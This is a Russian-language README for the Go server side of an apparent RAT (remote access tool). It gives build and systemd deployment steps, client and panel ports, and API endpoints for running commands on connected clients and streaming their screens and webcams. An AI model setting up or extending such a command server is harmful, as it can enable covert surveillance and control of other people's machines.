# RAT Сервер

Серверная часть для RAT (Remote Access Tool) на Go. Сервер принимает подключения от клиентов и предоставляет API для панели управления.

## Требования

- Go 1.18 или выше
- Ubuntu Server (рекомендуется для продакшн)

## Установка

1. Клонируйте репозиторий:
```bash
git clone [url-репозитория]
cd RatProject/Server
```

2. Установите зависимости:
```bash
go mod download
```

3. Соберите сервер:
```bash
go build -o rat_server
```

## Запуск

### Локально
```bash
./rat_server
```

### На сервере в фоновом режиме
```bash
nohup ./rat_server > server.log 2>&1 &
```

### С помощью systemd
Создайте файл `/etc/systemd/system/rat-server.service`:

```
[Unit]
Description=RAT Server
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/path/to/RatProject/Server
ExecStart=/path/to/RatProject/Server/rat_server
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

Затем запустите:
```bash
sudo systemctl enable rat-server
sudo systemctl start rat-server
```

## Порты

- TCP 5555: Подключения RAT клиентов
- HTTP 8080: API для панели управления

## API

Сервер предоставляет следующие API для взаимодействия с панелью управления:

### Получение списка всех клиентов
```
GET /api/clients
```

### Получение информации о конкретном клиенте
```
GET /api/client/{client_id}
```

### Отправка команды клиенту
```
POST /api/command
{
  "client_id": "12345",
  "type": "exec_command",
  "payload": {
    "command": "whoami"
  }
}
```

### Управление стримингом (скриншоты, веб-камера и т.д.)
```
POST /api/stream?client_id=12345&type=screen
``` 